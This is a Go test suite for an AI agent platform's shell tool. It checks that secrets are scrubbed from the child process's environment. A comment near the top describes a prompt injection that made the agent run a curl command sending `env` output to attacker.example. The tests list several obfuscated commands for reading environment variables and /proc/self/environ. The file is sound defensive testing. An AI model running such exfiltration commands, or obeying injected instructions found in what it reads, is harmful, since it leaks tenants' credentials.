package shell_test

import (
	"context"
	"testing"
	"time"

	"github.com/stretchr/testify/suite"

	"github.com/makifbaysal/tasktrooper/server/internal/adapter/tools/shell"
	"github.com/makifbaysal/tasktrooper/server/internal/application/config"
	"github.com/makifbaysal/tasktrooper/server/internal/application/registry"
	"github.com/makifbaysal/tasktrooper/server/resources"
)

// EnvScrubSuite covers what the run_terminal sandbox cannot do by inspecting
// command text.
//
// The child used to inherit os.Environ() — the tenant bridge's own environment,
// which holds DATABASE_URL, INTERNAL_AUTH_KEY, MCP_SECRETS_KEY and the provider
// API keys. The agent loop reads untrusted content every iteration (repository
// files, task descriptions, fetch_url responses), so one prompt injection
// produced `curl https://attacker.example -d "$(env)"` and the pod's
// credentials left in a single request. Pattern-blocking "env" is not a fix:
// the spellings are unbounded. These tests assert the structural property
// instead — the secrets are not in the child's environment at all, so there is
// nothing for any spelling to find.
type EnvScrubSuite struct {
	suite.Suite
}

func TestEnvScrubSuite(t *testing.T) {
	suite.Run(t, new(EnvScrubSuite))
}

// plantedSecrets mirrors the tenant Deployment's env (internal/control/kube)
// plus a provider key, keyed by variable name to the value that must not appear
// in any command's output.
var plantedSecrets = map[string]string{
	"DATABASE_URL":      "postgres://tenant:hunter2@10.0.0.5:5432/tenant_x",
	"INTERNAL_AUTH_KEY": "gateway-hmac-key-9f21",
	"MCP_SECRETS_KEY":   "bWNwLXNlY3JldHMta2V5",
	"OPENAI_API_KEY":    "sk-proj-must-not-leak",
	"ANTHROPIC_API_KEY": "sk-ant-must-not-leak",
	"SERVER_API_KEY":    "bridge-server-key",
	"PG_PASSWORD":       "postgres-superuser-password",
}

func (s *EnvScrubSuite) plantSecrets() {
	for name, value := range plantedSecrets {
		s.T().Setenv(name, value)
	}
}

func (s *EnvScrubSuite) assertNoSecrets(output string) {
	for name, value := range plantedSecrets {
		s.NotContains(output, value, "secret value for %s reached the child", name)
		s.NotContains(output, name+"=", "variable %s reached the child", name)
	}
}

func (s *EnvScrubSuite) TestChildEnvironmentCarriesNoSecrets() {
	s.plantSecrets()
	tool := shell.New("/tmp", 30*time.Second, 0, offSandbox())

	result := tool.Execute(context.Background(), `{"command":"env"}`)

	s.False(result.IsError, result.Content)
	s.assertNoSecrets(result.Content)
}

// The point of scrubbing rather than pattern-matching: none of these spellings
// needs to be anticipated, because none of them has anything to read. If this
// ever fails for one spelling and passes for another, the defense has silently
// regressed back into text matching.
func (s *EnvScrubSuite) TestObfuscatedEnvReadsFindNothing() {
	s.plantSecrets()
	tool := shell.New("/tmp", 30*time.Second, 0, offSandbox())

	for _, command := range []string{
		`env`,
		`printenv`,
		`e''nv`,
		`export -p`,
		`set`,
		`echo "$INTERNAL_AUTH_KEY$DATABASE_URL$OPENAI_API_KEY"`,
		`sh -c env`,
		`env | grep -i key`,
		`printf '%s' "$(env)"`,
		`cat /proc/self/environ`,
	} {
		result := tool.Execute(context.Background(), `{"command":`+quote(command)+`}`)
		s.assertNoSecrets(result.Content)
	}
}

// The sandbox every cloud tenant actually runs, not a hand-built config.
func (s *EnvScrubSuite) TestShippedSandboxScrubsSecrets() {
	s.plantSecrets()
	cfg, err := config.Parse(resources.ConfigYAML)
	s.Require().NoError(err)

	dir := s.T().TempDir()
	tool := shell.New(dir, 30*time.Second, 0, cfg.Tools.Terminal.Sandbox)
	ctx := registry.ContextWithWorkspaceDir(context.Background(), dir)

	result := tool.Execute(ctx, `{"command":"env"}`)

	s.False(result.IsError, result.Content)
	s.assertNoSecrets(result.Content)
}

// A scrub that breaks the toolchain gets switched off, so the forwarded set has
// to keep the edit → build → verify loop working.
func (s *EnvScrubSuite) TestToolchainVariablesStillReachTheChild() {
	s.T().Setenv("GOFLAGS", "-mod=mod")
	s.T().Setenv("JAVA_HOME", "/opt/java")
	s.T().Setenv("LC_ALL", "C.UTF-8")
	tool := shell.New("/tmp", 30*time.Second, 0, offSandbox())

	result := tool.Execute(context.Background(),
		`{"command":"echo path=[$PATH] home=[$HOME] goflags=[$GOFLAGS] java=[$JAVA_HOME] lc=[$LC_ALL]"}`)

	s.False(result.IsError, result.Content)
	s.NotContains(result.Content, "path=[]")
	s.NotContains(result.Content, "home=[]")
	s.Contains(result.Content, "goflags=[-mod=mod]")
	s.Contains(result.Content, "java=[/opt/java]")
	s.Contains(result.Content, "lc=[C.UTF-8]")
}

// PATH is what makes the child able to run anything at all; a scrubbed env with
// no PATH would fail every command with "not found".
func (s *EnvScrubSuite) TestBinariesRemainResolvable() {
	tool := shell.New("/tmp", 30*time.Second, 0, offSandbox())

	result := tool.Execute(context.Background(), `{"command":"command -v sh && command -v go"}`)

	s.False(result.IsError, result.Content)
	s.Contains(result.Content, "go")
}

// The per-task toolchain overlay is appended after the forwarded variables so
// it still wins — two concurrent runs pinning different Go versions must not
// collapse onto the host default.
func (s *EnvScrubSuite) TestTaskEnvOverlayStillWins() {
	s.T().Setenv("GOTOOLCHAIN", "host-default")
	tool := shell.New("/tmp", 30*time.Second, 0, offSandbox())
	ctx := registry.ContextWithTaskEnv(context.Background(), []string{"GOTOOLCHAIN=go1.23.4+auto"})

	result := tool.Execute(ctx, `{"command":"echo toolchain=[$GOTOOLCHAIN]"}`)

	s.False(result.IsError, result.Content)
	s.Contains(result.Content, "toolchain=[go1.23.4+auto]")
	s.NotContains(result.Content, "host-default")
}

// Git authentication in this codebase travels in a per-command http.extraHeader,
// never in the environment, so scrubbing takes no credential away from git. It
// does take the commit identity, which git needs in an image with no global
// config, and it must not leave git prompting on stdin until the timeout.
func (s *EnvScrubSuite) TestGitIdentityForwardedAndPromptsDisabled() {
	s.T().Setenv("GIT_AUTHOR_NAME", "TaskTrooper Agent")
	s.T().Setenv("GIT_COMMITTER_EMAIL", "agents@tasktrooper.ai")
	tool := shell.New("/tmp", 30*time.Second, 0, offSandbox())

	result := tool.Execute(context.Background(),
		`{"command":"echo author=[$GIT_AUTHOR_NAME] email=[$GIT_COMMITTER_EMAIL] prompt=[$GIT_TERMINAL_PROMPT]"}`)

	s.False(result.IsError, result.Content)
	s.Contains(result.Content, "author=[TaskTrooper Agent]")
	s.Contains(result.Content, "email=[agents@tasktrooper.ai]")
	s.Contains(result.Content, "prompt=[0]")
}
